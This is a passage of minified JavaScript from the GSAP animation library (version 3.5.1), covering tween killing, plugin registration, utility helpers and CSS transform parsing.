                var r = this.timeline.totalDuration();
                return (
                  this.timeline.killTweensOf(
                    t,
                    e,
                    je && !0 !== je.vars.overwrite
                  )._first || pe(this),
                  this.parent &&
                    r !== this.timeline.totalDuration() &&
                    Xt(this, (this._dur * this.timeline._tDur) / r, 0, 1),
                  this
                );
              }
              var i,
                n,
                s,
                o,
                a,
                l,
                h,
                u = this._targets,
                c = t ? re(t) : u,
                d = this._ptLookup,
                p = this._pt;
              if (
                (!e || "all" === e) &&
                (function (t, e) {
                  for (
                    var r = t.length, i = r === e.length;
                    i && r-- && t[r] === e[r];

                  );
                  return r < 0;
                })(u, c)
              )
                return "all" === e && (this._pt = 0), pe(this);
              for (
                i = this._op = this._op || [],
                  "all" !== e &&
                    (j(e) &&
                      ((a = {}),
                      yt(e, function (t) {
                        return (a[t] = 1);
                      }),
                      (e = a)),
                    (e = (function (t, e) {
                      var r,
                        i,
                        n,
                        s,
                        o = t[0] ? _t(t[0]).harness : 0,
                        a = o && o.aliases;
                      if (!a) return e;
                      for (i in ((r = Ft({}, e)), a))
                        if ((i in r))
                          for (n = (s = a[i].split(",")).length; n--; )
                            r[s[n]] = r[i];
                      return r;
                    })(u, e))),
                  h = u.length;
                h--;

              )
                if (~c.indexOf(u[h]))
                  for (a in ((n = d[h]),
                  "all" === e
                    ? ((i[h] = e), (o = n), (s = {}))
                    : ((s = i[h] = i[h] || {}), (o = e)),
                  o))
                    (l = n && n[a]) &&
                      (("kill" in l.d && !0 !== l.d.kill(a)) ||
                        Ot(this, l, "_pt"),
                      delete n[a]),
                      "all" !== s && (s[a] = 1);
              return this._initted && !this._pt && p && pe(this), this;
            }),
            (n.to = function (t, e) {
              return new n(t, e, arguments[2]);
            }),
            (n.from = function (t, e) {
              return new n(t, bt(arguments, 1));
            }),
            (n.delayedCall = function (t, e, r, i) {
              return new n(e, 0, {
                immediateRender: !1,
                lazy: !1,
                overwrite: !1,
                delay: t,
                onComplete: e,
                onReverseComplete: e,
                onCompleteParams: r,
                onReverseCompleteParams: r,
                callbackScope: i,
              });
            }),
            (n.fromTo = function (t, e, r) {
              return new n(t, bt(arguments, 2));
            }),
            (n.set = function (t, e) {
              return (
                (e.duration = 0), e.repeatDelay || (e.repeat = 0), new n(t, e)
              );
            }),
            (n.killTweensOf = function (t, e, r) {
              return i.killTweensOf(t, e, r);
            }),
            n
          );
        })(ze);
      Ct(Ye.prototype, {
        _targets: [],
        _lazy: 0,
        _startAt: 0,
        _op: 0,
        _onInit: 0,
      }),
        yt("staggerTo,staggerFrom,staggerFromTo", function (t) {
          Ye[t] = function () {
            var e = new Ie(),
              r = Jt.call(arguments, 0);
            return (
              r.splice("staggerFromTo" === t ? 5 : 4, 0, 0), e[t].apply(e, r)
            );
          };
        });
      var Ge = function (t, e, r) {
          return (t[e] = r);
        },
        Ke = function (t, e, r) {
          return t[e](r);
        },
        Qe = function (t, e, r, i) {
          return t[e](i.fp, r);
        },
        Ze = function (t, e, r) {
          return t.setAttribute(e, r);
        },
        $e = function (t, e) {
          return V(t[e]) ? Ke : U(t[e]) && t.setAttribute ? Ze : Ge;
        },
        Je = function (t, e) {
          return e.set(e.t, e.p, Math.round(1e4 * (e.s + e.c * t)) / 1e4, e);
        },
        tr = function (t, e) {
          return e.set(e.t, e.p, !!(e.s + e.c * t), e);
        },
        er = function (t, e) {
          var r = e._pt,
            i = "";
          if (!t && e.b) i = e.b;
          else if (1 === t && e.e) i = e.e;
          else {
            for (; r; )
              (i =
                r.p +
                (r.m
                  ? r.m(r.s + r.c * t)
                  : Math.round(1e4 * (r.s + r.c * t)) / 1e4) +
                i),
                (r = r._next);
            i += e.c;
          }
          e.set(e.t, e.p, i, e);
        },
        rr = function (t, e) {
          for (var r = e._pt; r; ) r.r(t, r.d), (r = r._next);
        },
        ir = function (t, e, r, i) {
          for (var n, s = this._pt; s; )
            (n = s._next), s.p === i && s.modifier(t, e, r), (s = n);
        },
        nr = function (t) {
          for (var e, r, i = this._pt; i; )
            (r = i._next),
              (i.p === t && !i.op) || i.op === t
                ? Ot(this, i, "_pt")
                : i.dep || (e = 1),
              (i = r);
          return !e;
        },
        sr = function (t, e, r, i) {
          i.mSet(t, e, i.m.call(i.tween, r, i.mt), i);
        },
        or = function (t) {
          for (var e, r, i, n, s = t._pt; s; ) {
            for (e = s._next, r = i; r && r.pr > s.pr; ) r = r._next;
            (s._prev = r ? r._prev : n) ? (s._prev._next = s) : (i = s),
              (s._next = r) ? (r._prev = s) : (n = s),
              (s = e);
          }
          t._pt = i;
        },
        ar = (function () {
          function t(t, e, r, i, n, s, o, a, l) {
            (this.t = e),
              (this.s = i),
              (this.c = n),
              (this.p = r),
              (this.r = s || Je),
              (this.d = o || this),
              (this.set = a || Ge),
              (this.pr = l || 0),
              (this._next = t),
              t && (t._prev = this);
          }
          return (
            (t.prototype.modifier = function (t, e, r) {
              (this.mSet = this.mSet || this.set),
                (this.set = sr),
                (this.m = t),
                (this.mt = r),
                (this.tween = e);
            }),
            t
          );
        })();
      yt(
        gt +
          "parent,duration,ease,delay,overwrite,runBackwards,startAt,yoyo,immediateRender,repeat,repeatDelay,data,paused,reversed,lazy,callbackScope,stringFilter,id,yoyoEase,stagger,inherit,repeatRefresh,keyframes,autoRevert,scrollTrigger",
        function (t) {
          return (lt[t] = 1);
        }
      ),
        (et.TweenMax = et.TweenLite = Ye),
        (et.TimelineLite = et.TimelineMax = Ie),
        (i = new Ie({
          sortChildren: !1,
          defaults: R,
          autoRemoveChildren: !0,
          id: "root",
          smoothChildTiming: !0,
        })),
        (M.stringFilter = be);
      var lr = {
        registerPlugin: function () {
          for (var t = arguments.length, e = new Array(t), r = 0; r < t; r++)
            e[r] = arguments[r];
          e.forEach(function (t) {
            return (function (t) {
              var e = (t = (!t.name && t.default) || t).name,
                r = V(t),
                i =
                  e && !r && t.init
                    ? function () {
                        this._props = [];
                      }
                    : t,
                n = {
                  init: at,
                  render: rr,
                  add: Ne,
                  kill: nr,
                  modifier: ir,
                  rawVars: 0,
                },
                s = {
                  targetTest: 0,
                  get: 0,
                  getSetter: $e,
                  aliases: {},
                  register: 0,
                };
              if ((Te(), t !== i)) {
                if (ct[e]) return;
                Ct(i, Ct(Rt(t, n), s)),
                  Ft(i.prototype, Ft(n, Rt(t, s))),
                  (ct[(i.prop = e)] = i),
                  t.targetTest && (ft.push(i), (lt[e] = 1)),
                  (e =
                    ("css" === e
                      ? "CSS"
                      : e.charAt(0).toUpperCase() + e.substr(1)) + "Plugin");
              }
              ot(e, i), t.register && t.register(cr, i, ar);
            })(t);
          });
        },
        timeline: function (t) {
          return new Ie(t);
        },
        getTweensOf: function (t, e) {
          return i.getTweensOf(t, e);
        },
        getProperty: function (t, e, r, i) {
          j(t) && (t = re(t)[0]);
          var n = _t(t || {}).get,
            s = r ? Et : St;
          return (
            "native" === r && (r = ""),
            t
              ? e
                ? s(((ct[e] && ct[e].get) || n)(t, e, r, i))
                : function (e, r, i) {
                    return s(((ct[e] && ct[e].get) || n)(t, e, r, i));
                  }
              : t
          );
        },
        quickSetter: function (t, e, r) {
          if ((t = re(t)).length > 1) {
            var i = t.map(function (t) {
                return cr.quickSetter(t, e, r);
              }),
              n = i.length;
            return function (t) {
              for (var e = n; e--; ) i[e](t);
            };
          }
          t = t[0] || {};
          var s = ct[e],
            o = _t(t),
            a = (o.harness && (o.harness.aliases || {})[e]) || e,
            l = s
              ? function (e) {
                  var i = new s();
                  (h._pt = 0),
                    i.init(t, r ? e + r : e, h, 0, [t]),
                    i.render(1, i),
                    h._pt && rr(1, h);
                }
              : o.set(t, a);
          return s
            ? l
            : function (e) {
                return l(t, a, r ? e + r : e, o, 1);
              };
        },
        isTweening: function (t) {
          return i.getTweensOf(t, !0).length > 0;
        },
        defaults: function (t) {
          return t && t.ease && (t.ease = Re(t.ease, R.ease)), Mt(R, t || {});
        },
        config: function (t) {
          return Mt(M, t || {});
        },
        registerEffect: function (t) {
          var e = t.name,
            r = t.effect,
            i = t.plugins,
            n = t.defaults,
            s = t.extendTimeline;
          (i || "").split(",").forEach(function (t) {
            return (
              t &&
              !ct[t] &&
              !et[t] &&
              st(e + " effect requires " + t + " plugin.")
            );
          }),
            (dt[e] = function (t, e, i) {
              return r(re(t), Ct(e || {}, n), i);
            }),
            s &&
              (Ie.prototype[e] = function (t, r, i) {
                return this.add(dt[e](t, W(r) ? r : (i = r) && {}, this), i);
              });
        },
        registerEase: function (t, e) {
          Se[t] = Re(e);
        },
        parseEase: function (t, e) {
          return arguments.length ? Re(t, e) : Se;
        },
        getById: function (t) {
          return i.getById(t);
        },
        exportRoot: function (t, e) {
          void 0 === t && (t = {});
          var r,
            n,
            s = new Ie(t);
          for (
            s.smoothChildTiming = H(t.smoothChildTiming),
              i.remove(s),
              s._dp = 0,
              s._time = s._tTime = i._time,
              r = i._first;
            r;

          )
            (n = r._next),
              (!e &&
                !r._dur &&
                r instanceof Ye &&
                r.vars.onComplete === r._targets[0]) ||
                Wt(s, r, r._start - r._delay),
              (r = n);
          return Wt(i, s, 0), s;
        },
        utils: {
          wrap: function t(e, r, i) {
            var n = r - e;
            return G(e)
              ? le(e, t(0, e.length), r)
              : Qt(i, function (t) {
                  return ((n + ((t - e) % n)) % n) + e;
                });
          },
          wrapYoyo: function t(e, r, i) {
            var n = r - e,
              s = 2 * n;
            return G(e)
              ? le(e, t(0, e.length - 1), r)
              : Qt(i, function (t) {
                  return (
                    e + ((t = (s + ((t - e) % s)) % s || 0) > n ? s - t : t)
                  );
                });
          },
          distribute: ne,
          random: ae,
          snap: oe,
          normalize: function (t, e, r) {
            return ue(t, e, 0, 1, r);
          },
          getUnit: $t,
          clamp: function (t, e, r) {
            return Qt(r, function (r) {
              return Zt(t, e, r);
            });
          },
          splitColor: _e,
          toArray: re,
          mapRange: ue,
          pipe: function () {
            for (var t = arguments.length, e = new Array(t), r = 0; r < t; r++)
              e[r] = arguments[r];
            return function (t) {
              return e.reduce(function (t, e) {
                return e(t);
              }, t);
            };
          },
          unitize: function (t, e) {
            return function (r) {
              return t(parseFloat(r)) + (e || $t(r));
            };
          },
          interpolate: function t(e, r, i, n) {
            var s = isNaN(e + r)
              ? 0
              : function (t) {
                  return (1 - t) * e + t * r;
                };
            if (!s) {
              var o,
                a,
                l,
                h,
                u,
                c = j(e),
                d = {};
              if ((!0 === i && (n = 1) && (i = null), c))
                (e = { p: e }), (r = { p: r });
              else if (G(e) && !G(r)) {
                for (l = [], h = e.length, u = h - 2, a = 1; a < h; a++)
                  l.push(t(e[a - 1], e[a]));
                h--,
                  (s = function (t) {
                    t *= h;
                    var e = Math.min(u, ~~t);
                    return l[e](t - e);
                  }),
                  (i = r);
              } else n || (e = Ft(G(e) ? [] : {}, e));
              if (!l) {
                for (o in r) Ne.call(d, e, o, "get", r[o]);
                s = function (t) {
                  return rr(t, d) || (c ? e.p : e);
                };
              }
            }
            return Qt(i, s);
          },
          shuffle: ie,
        },
        install: it,
        effects: dt,
        ticker: we,
        updateRoot: Ie.updateRoot,
        plugins: ct,
        globalTimeline: i,
        core: {
          PropTween: ar,
          globals: ot,
          Tween: Ye,
          Timeline: Ie,
          Animation: ze,
          getCache: _t,
          _removeLinkedListItem: Ot,
        },
      };
      yt("to,from,fromTo,delayedCall,set,killTweensOf", function (t) {
        return (lr[t] = Ye[t]);
      }),
        we.add(Ie.updateRoot),
        (h = lr.to({}, { duration: 0 }));
      var hr = function (t, e) {
          for (var r = t._pt; r && r.p !== e && r.op !== e && r.fp !== e; )
            r = r._next;
          return r;
        },
        ur = function (t, e) {
          return {
            name: t,
            rawVars: 1,
            init: function (t, r, i) {
              i._onInit = function (t) {
                var i, n;
                if (
                  (j(r) &&
                    ((i = {}),
                    yt(r, function (t) {
                      return (i[t] = 1);
                    }),
                    (r = i)),
                  e)
                ) {
                  for (n in ((i = {}), r)) i[n] = e(r[n]);
                  r = i;
                }
                !(function (t, e) {
                  var r,
                    i,
                    n,
                    s = t._targets;
                  for (r in e)
                    for (i = s.length; i--; )
                      (n = t._ptLookup[i][r]) &&
                        (n = n.d) &&
                        (n._pt && (n = hr(n, r)),
                        n && n.modifier && n.modifier(e[r], t, s[i], r));
                })(t, r);
              };
            },
          };
        },
        cr =
          lr.registerPlugin(
            {
              name: "attr",
              init: function (t, e, r, i, n) {
                var s, o;
                for (s in e)
                  (o = this.add(
                    t,
                    "setAttribute",
                    (t.getAttribute(s) || 0) + "",
                    e[s],
                    i,
                    n,
                    0,
                    0,
                    s
                  )) && (o.op = s),
                    this._props.push(s);
              },
            },
            {
              name: "endArray",
              init: function (t, e) {
                for (var r = e.length; r--; ) this.add(t, r, t[r] || 0, e[r]);
              },
            },
            ur("roundProps", se),
            ur("modifiers"),
            ur("snap", oe)
          ) || lr;
      (Ye.version = Ie.version = cr.version = "3.5.1"), (a = 1), q() && Te();
      var dr,
        pr,
        fr,
        gr,
        mr,
        _r,
        vr,
        yr,
        Dr = Se.Power0,
        xr = Se.Power1,
        br = Se.Power2,
        wr = Se.Power3,
        Tr = Se.Power4,
        Sr = Se.Linear,
        Er = Se.Quad,
        Cr = Se.Cubic,
        Pr = Se.Quart,
        Fr = Se.Quint,
        Mr = Se.Strong,
        Rr = Se.Elastic,
        Ar = Se.Back,
        Or = Se.SteppedEase,
        kr = Se.Bounce,
        Lr = Se.Sine,
        Br = Se.Expo,
        zr = Se.Circ,
        Ir = {},
        jr = 180 / Math.PI,
        Vr = Math.PI / 180,
        Nr = Math.atan2,
        Ur = /([A-Z])/g,
        Wr = /(?:left|right|width|margin|padding|x)/i,
        Hr = /[\s,\(]\S/,
        qr = {
          autoAlpha: "opacity,visibility",
          scale: "scaleX,scaleY",
          alpha: "opacity",
        },
        Xr = function (t, e) {
          return e.set(
            e.t,
            e.p,
            Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u,
            e
          );
        },
        Yr = function (t, e) {
          return e.set(
            e.t,
            e.p,
            1 === t ? e.e : Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u,
            e
          );
        },
        Gr = function (t, e) {
          return e.set(
            e.t,
            e.p,
            t ? Math.round(1e4 * (e.s + e.c * t)) / 1e4 + e.u : e.b,
            e
          );
        },
        Kr = function (t, e) {
          var r = e.s + e.c * t;
          e.set(e.t, e.p, ~~(r + (r < 0 ? -0.5 : 0.5)) + e.u, e);
        },
        Qr = function (t, e) {
          return e.set(e.t, e.p, t ? e.e : e.b, e);
        },
        Zr = function (t, e) {
          return e.set(e.t, e.p, 1 !== t ? e.b : e.e, e);
        },
        $r = function (t, e, r) {
          return (t.style[e] = r);
        },
        Jr = function (t, e, r) {
          return t.style.setProperty(e, r);
        },
        ti = function (t, e, r) {
          return (t._gsap[e] = r);
        },
        ei = function (t, e, r) {
          return (t._gsap.scaleX = t._gsap.scaleY = r);
        },
        ri = function (t, e, r, i, n) {
          var s = t._gsap;
          (s.scaleX = s.scaleY = r), s.renderTransform(n, s);
        },
        ii = function (t, e, r, i, n) {
          var s = t._gsap;
          (s[e] = r), s.renderTransform(n, s);
        },
        ni = "transform",
        si = ni + "Origin",
        oi = function (t, e) {
          var r = pr.createElementNS
            ? pr.createElementNS(
                (e || "http://www.w3.org/1999/xhtml").replace(/^https/, "http"),
                t
              )
            : pr.createElement(t);
          return r.style ? r : pr.createElement(t);
        },
        ai = function t(e, r, i) {
          var n = getComputedStyle(e);
          return (
            n[r] ||
            n.getPropertyValue(r.replace(Ur, "-$1").toLowerCase()) ||
            n.getPropertyValue(r) ||
            (!i && t(e, hi(r) || r, 1)) ||
            ""
          );
        },
        li = "O,Moz,ms,Ms,Webkit".split(","),
        hi = function (t, e, r) {
          var i = (e || mr).style,
            n = 5;
          if (t in i && !r) return t;
          for (
            t = t.charAt(0).toUpperCase() + t.substr(1);
            n-- && !(li[n] + t in i);

          );
          return n < 0 ? null : (3 === n ? "ms" : n >= 0 ? li[n] : "") + t;
        },
        ui = function () {
          "undefined" != typeof window &&
            window.document &&
            ((dr = window),
            (pr = dr.document),
            (fr = pr.documentElement),
            (mr = oi("div") || { style: {} }),
            (_r = oi("div")),
            (ni = hi(ni)),
            (si = ni + "Origin"),
            (mr.style.cssText =
              "border-width:0;line-height:0;position:absolute;padding:0"),
            (yr = !!hi("perspective")),
            (gr = 1));
        },
        ci = function t(e) {
          var r,
            i = oi(
              "svg",
              (this.ownerSVGElement &&
                this.ownerSVGElement.getAttribute("xmlns")) ||
                "http://www.w3.org/2000/svg"
            ),
            n = this.parentNode,
            s = this.nextSibling,
            o = this.style.cssText;
          if (
            (fr.appendChild(i),
            i.appendChild(this),
            (this.style.display = "block"),
            e)
          )
            try {
              (r = this.getBBox()),
                (this._gsapBBox = this.getBBox),
                (this.getBBox = t);
            } catch (t) {}
          else this._gsapBBox && (r = this._gsapBBox());
          return (
            n && (s ? n.insertBefore(this, s) : n.appendChild(this)),
            fr.removeChild(i),
            (this.style.cssText = o),
            r
          );
        },
        di = function (t, e) {
          for (var r = e.length; r--; )
            if (t.hasAttribute(e[r])) return t.getAttribute(e[r]);
        },
        pi = function (t) {
          var e;
          try {
            e = t.getBBox();
          } catch (r) {
            e = ci.call(t, !0);
          }
          return (
            (e && (e.width || e.height)) ||
              t.getBBox === ci ||
              (e = ci.call(t, !0)),
            !e || e.width || e.x || e.y
              ? e
              : {
                  x: +di(t, ["x", "cx", "x1"]) || 0,
                  y: +di(t, ["y", "cy", "y1"]) || 0,
                  width: 0,
                  height: 0,
                }
          );
        },
        fi = function (t) {
          return !(!t.getCTM || (t.parentNode && !t.ownerSVGElement) || !pi(t));
        },
        gi = function (t, e) {
          if (e) {
            var r = t.style;
            e in Ir && e !== si && (e = ni),
              r.removeProperty
                ? (("ms" !== e.substr(0, 2) && "webkit" !== e.substr(0, 6)) ||
                    (e = "-" + e),
                  r.removeProperty(e.replace(Ur, "-$1").toLowerCase()))
                : r.removeAttribute(e);
          }
        },
        mi = function (t, e, r, i, n, s) {
          var o = new ar(t._pt, e, r, 0, 1, s ? Zr : Qr);
          return (t._pt = o), (o.b = i), (o.e = n), t._props.push(r), o;
        },
        _i = { deg: 1, rad: 1, turn: 1 },
        vi = function t(e, r, i, n) {
          var s,
            o,
            a,
            l,
            h = parseFloat(i) || 0,
            u = (i + "").trim().substr((h + "").length) || "px",
            c = mr.style,
            d = Wr.test(r),
            p = "svg" === e.tagName.toLowerCase(),
            f = (p ? "client" : "offset") + (d ? "Width" : "Height"),
            g = "px" === n,
            m = "%" === n;
          return n === u || !h || _i[n] || _i[u]
            ? h
            : ("px" !== u && !g && (h = t(e, r, i, "px")),
              (l = e.getCTM && fi(e)),
              m && (Ir[r] || ~r.indexOf("adius"))
                ? Dt(
                    (h / (l ? e.getBBox()[d ? "width" : "height"] : e[f])) * 100
                  )
                : ((c[d ? "width" : "height"] = 100 + (g ? u : n)),
                  (o =
                    ~r.indexOf("adius") || ("em" === n && e.appendChild && !p)
                      ? e
                      : e.parentNode),
                  l && (o = (e.ownerSVGElement || {}).parentNode),
                  (o && o !== pr && o.appendChild) || (o = pr.body),
                  (a = o._gsap) && m && a.width && d && a.time === we.time
                    ? Dt((h / a.width) * 100)
                    : ((m || "%" === u) && (c.position = ai(e, "position")),
                      o === e && (c.position = "static"),
                      o.appendChild(mr),
                      (s = mr[f]),
                      o.removeChild(mr),
                      (c.position = "absolute"),
                      d &&
                        m &&
                        (((a = _t(o)).time = we.time), (a.width = o[f])),
                      Dt(g ? (s * h) / 100 : s && h ? (100 / s) * h : 0))));
        },
        yi = function (t, e, r, i) {
          var n;
          return (
            gr || ui(),
            e in qr &&
              "transform" !== e &&
              ~(e = qr[e]).indexOf(",") &&
              (e = e.split(",")[0]),
            Ir[e] && "transform" !== e
              ? ((n = Mi(t, i)),
                (n =
                  "transformOrigin" !== e
                    ? n[e]
                    : Ri(ai(t, si)) + " " + n.zOrigin + "px"))
              : (!(n = t.style[e]) ||
                  "auto" === n ||
                  i ||
                  ~(n + "").indexOf("calc(")) &&
                (n =
                  (wi[e] && wi[e](t, e, r)) ||
                  ai(t, e) ||
                  vt(t, e) ||
                  ("opacity" === e ? 1 : 0)),
            r && !~(n + "").indexOf(" ") ? vi(t, e, n, r) + r : n
          );
        },
        Di = function (t, e, r, i) {
          if (!r || "none" === r) {
            var n = hi(e, t, 1),
              s = n && ai(t, n, 1);
            s && s !== r
              ? ((e = n), (r = s))
              : "borderColor" === e && (r = ai(t, "borderTopColor"));
          }
          var o,
            a,
            l,
            h,
            u,
            c,
            d,
            p,
            f,
            g,
            m,
            _,
            v = new ar(this._pt, t.style, e, 0, 1, er),
            y = 0,
            D = 0;
          if (
            ((v.b = r),
            (v.e = i),
            (r += ""),
            "auto" == (i += "") &&
              ((t.style[e] = i), (i = ai(t, e) || i), (t.style[e] = r)),
            be((o = [r, i])),
            (i = o[1]),
            (l = (r = o[0]).match(Z) || []),
            (i.match(Z) || []).length)
          ) {
            for (; (a = Z.exec(i)); )
              (d = a[0]),
                (f = i.substring(y, a.index)),
                u
                  ? (u = (u + 1) % 5)
                  : ("rgba(" !== f.substr(-5) && "hsla(" !== f.substr(-5)) ||
                    (u = 1),
                d !== (c = l[D++] || "") &&
                  ((h = parseFloat(c) || 0),
                  (m = c.substr((h + "").length)),
                  (_ = "=" === d.charAt(1) ? +(d.charAt(0) + "1") : 0) &&
                    (d = d.substr(2)),
                  (p = parseFloat(d)),
                  (g = d.substr((p + "").length)),
                  (y = Z.lastIndex - g.length),
                  g ||
                    ((g = g || M.units[e] || m),
                    y === i.length && ((i += g), (v.e += g))),
                  m !== g && (h = vi(t, e, c, g) || 0),
                  (v._pt = {
                    _next: v._pt,
                    p: f || 1 === D ? f : ",",
                    s: h,
                    c: _ ? _ * p : p - h,
                    m: u && u < 4 ? Math.round : 0,
                  }));
            v.c = y < i.length ? i.substring(y, i.length) : "";
          } else v.r = "display" === e && "none" === i ? Zr : Qr;
          return J.test(i) && (v.e = 0), (this._pt = v), v;
        },
        xi = {
          top: "0%",
          bottom: "100%",
          left: "0%",
          right: "100%",
          center: "50%",
        },
        bi = function (t, e) {
          if (e.tween && e.tween._time === e.tween._dur) {
            var r,
              i,
              n,
              s = e.t,
              o = s.style,
              a = e.u,
              l = s._gsap;
            if ("all" === a || !0 === a) (o.cssText = ""), (i = 1);
            else
              for (n = (a = a.split(",")).length; --n > -1; )
                (r = a[n]),
                  Ir[r] && ((i = 1), (r = "transformOrigin" === r ? si : ni)),
                  gi(s, r);
            i &&
              (gi(s, ni),
              l &&
                (l.svg && s.removeAttribute("transform"),
                Mi(s, 1),
                (l.uncache = 1)));
          }
        },
        wi = {
          clearProps: function (t, e, r, i, n) {
            if ("isFromStart" !== n.data) {
              var s = (t._pt = new ar(t._pt, e, r, 0, 0, bi));
              return (
                (s.u = i), (s.pr = -10), (s.tween = n), t._props.push(r), 1
              );
            }
          },
        },
        Ti = [1, 0, 0, 1, 0, 0],
        Si = {},
        Ei = function (t) {
          return "matrix(1, 0, 0, 1, 0, 0)" === t || "none" === t || !t;
        },
        Ci = function (t) {
          var e = ai(t, ni);
          return Ei(e) ? Ti : e.substr(7).match(Q).map(Dt);
        },
        Pi = function (t, e) {
          var r,
            i,
            n,
            s,
            o = t._gsap || _t(t),
            a = t.style,
            l = Ci(t);
          return o.svg && t.getAttribute("transform")
            ? "1,0,0,1,0,0" ===
              (l = [
                (n = t.transform.baseVal.consolidate().matrix).a,
                n.b,
                n.c,
                n.d,
                n.e,
                n.f,
              ]).join(",")
              ? Ti
              : l
            : (l !== Ti ||
                t.offsetParent ||
                t === fr ||
                o.svg ||
                ((n = a.display),
                (a.display = "block"),
                ((r = t.parentNode) && t.offsetParent) ||
                  ((s = 1), (i = t.nextSibling), fr.appendChild(t)),
                (l = Ci(t)),
                n ? (a.display = n) : gi(t, "display"),
                s &&
                  (i
                    ? r.insertBefore(t, i)
                    : r
                    ? r.appendChild(t)
                    : fr.removeChild(t))),
              e && l.length > 6 ? [l[0], l[1], l[4], l[5], l[12], l[13]] : l);
        },
        Fi = function (t, e, r, i, n, s) {
          var o,
            a,
            l,
            h = t._gsap,
            u = n || Pi(t, !0),
            c = h.xOrigin || 0,
            d = h.yOrigin || 0,
            p = h.xOffset || 0,
            f = h.yOffset || 0,
            g = u[0],
            m = u[1],
            _ = u[2],
            v = u[3],
            y = u[4],
            D = u[5],
            x = e.split(" "),
            b = parseFloat(x[0]) || 0,
            w = parseFloat(x[1]) || 0;
          r
            ? u !== Ti &&
              (a = g * v - m * _) &&
              ((l = b * (-m / a) + w * (g / a) - (g * D - m * y) / a),
              (b = b * (v / a) + w * (-_ / a) + (_ * D - v * y) / a),
              (w = l))
            : ((b =
                (o = pi(t)).x + (~x[0].indexOf("%") ? (b / 100) * o.width : b)),
              (w =
                o.y +
                (~(x[1] || x[0]).indexOf("%") ? (w / 100) * o.height : w))),
            i || (!1 !== i && h.smooth)
              ? ((y = b - c),
                (D = w - d),
                (h.xOffset = p + (y * g + D * _) - y),
                (h.yOffset = f + (y * m + D * v) - D))
              : (h.xOffset = h.yOffset = 0),
            (h.xOrigin = b),
            (h.yOrigin = w),
            (h.smooth = !!i),
            (h.origin = e),
            (h.originIsAbsolute = !!r),
            (t.style[si] = "0px 0px"),
            s &&
              (mi(s, h, "xOrigin", c, b),
              mi(s, h, "yOrigin", d, w),
              mi(s, h, "xOffset", p, h.xOffset),
              mi(s, h, "yOffset", f, h.yOffset)),
            t.setAttribute("data-svg-origin", b + " " + w);
        },
        Mi = function (t, e) {
          var r = t._gsap || new Be(t);
          if ("x" in r && !e && !r.uncache) return r;
          var i,
            n,
            s,
            o,
            a,
            l,
            h,
            u,
            c,
            d,
            p,
            f,
            g,
            m,
            _,
            v,
            y,
            D,
            x,
            b,
            w,
            T,
            S,
            E,
            C,
            P,
            F,
            R,
            A,
            O,
            k,
            L,
            B = t.style,
            z = r.scaleX < 0,
            I = ai(t, si) || "0";
          return (
            (i = n = s = l = h = u = c = d = p = 0),
            (o = a = 1),
            (r.svg = !(!t.getCTM || !fi(t))),
            (m = Pi(t, r.svg)),
            r.svg &&
              ((E = !r.uncache && t.getAttribute("data-svg-origin")),
              Fi(t, E || I, !!E || r.originIsAbsolute, !1 !== r.smooth, m)),
            (f = r.xOrigin || 0),
            (g = r.yOrigin || 0),
            m !== Ti &&
              ((D = m[0]),
              (x = m[1]),
              (b = m[2]),
              (w = m[3]),
              (i = T = m[4]),
              (n = S = m[5]),
              6 === m.length
                ? ((o = Math.sqrt(D * D + x * x)),
                  (a = Math.sqrt(w * w + b * b)),
                  (l = D || x ? Nr(x, D) * jr : 0),
                  (c = b || w ? Nr(b, w) * jr + l : 0) &&
                    (a *= Math.cos(c * Vr)),
                  r.svg &&
                    ((i -= f - (f * D + g * b)), (n -= g - (f * x + g * w))))
                : ((L = m[6]),
                  (O = m[7]),
                  (F = m[8]),
                  (R = m[9]),
                  (A = m[10]),
                  (k = m[11]),
                  (i = m[12]),
                  (n = m[13]),
                  (s = m[14]),
                  (h = (_ = Nr(L, A)) * jr),
                  _ &&
                    ((E = T * (v = Math.cos(-_)) + F * (y = Math.sin(-_))),
                    (C = S * v + R * y),
                    (P = L * v + A * y),
                    (F = T * -y + F * v),
                    (R = S * -y + R * v),
                    (A = L * -y + A * v),
                    (k = O * -y + k * v),
                    (T = E),
                    (S = C),
                    (L = P)),
                  (u = (_ = Nr(-b, A)) * jr),
                  _ &&
                    ((v = Math.cos(-_)),
                    (k = w * (y = Math.sin(-_)) + k * v),
                    (D = E = D * v - F * y),
                    (x = C = x * v - R * y),
                    (b = P = b * v - A * y)),
                  (l = (_ = Nr(x, D)) * jr),
                  _ &&
                    ((E = D * (v = Math.cos(_)) + x * (y = Math.sin(_))),
                    (C = T * v + S * y),
                    (x = x * v - D * y),
                    (S = S * v - T * y),
                    (D = E),
                    (T = C)),
                  h &&
                    Math.abs(h) + Math.abs(l) > 359.9 &&
                    ((h = l = 0), (u = 180 - u)),
                  (o = Dt(Math.sqrt(D * D + x * x + b * b))),
                  (a = Dt(Math.sqrt(S * S + L * L))),
                  (_ = Nr(T, S)),
                  (c = Math.abs(_) > 2e-4 ? _ * jr : 0),
                  (p = k ? 1 / (k < 0 ? -k : k) : 0)),
              r.svg &&
                ((E = t.getAttribute("transform")),
                (r.forceCSS =
                  t.setAttribute("transform", "") || !Ei(ai(t, ni))),
                E && t.setAttribute("transform", E))),
            Math.abs(c) > 90 &&
              Math.abs(c) < 270 &&
              (z
                ? ((o *= -1),
                  (c += l <= 0 ? 180 : -180),
                  (l += l <= 0 ? 180 : -180))
                : ((a *= -1), (c += c <= 0 ? 180 : -180))),
            (r.x =
              ((r.xPercent =
                i && Math.round(t.offsetWidth / 2) === Math.round(-i) ? -50 : 0)
                ? 0
                : i) + "px"),
            (r.y =
              ((r.yPercent =
                n && Math.round(t.offsetHeight / 2) === Math.round(-n)
                  ? -50
                  : 0)
                ? 0
                : n) + "px"),
            (r.z = s + "px"),
            (r.scaleX = Dt(o)),
            (r.scaleY = Dt(a)),
            (r.rotation = Dt(l) + "deg"),
            (r.rotationX = Dt(h) + "deg"),
            (r.rotationY = Dt(u) + "deg"),
            (r.skewX = c + "deg"),
            (r.skewY = d + "deg"),
            (r.transformPerspective = p + "px"),
            (r.zOrigin = parseFloat(I.split(" ")[2]) || 0) && (B[si] = Ri(I)),
            (r.xOffset = r.yOffset = 0),
            (r.force3D = M.force3D),
            (r.renderTransform = r.svg ? Li : yr ? ki : Oi),
            (r.uncache = 0),
            r
          );
        },
        Ri = function (t) {
          return (t = t.split(" "))[0] + " " + t[1];
        },
        Ai = function (t, e, r) {
          var i = $t(e);
          return Dt(parseFloat(e) + parseFloat(vi(t, "x", r + "px", i))) + i;
        },
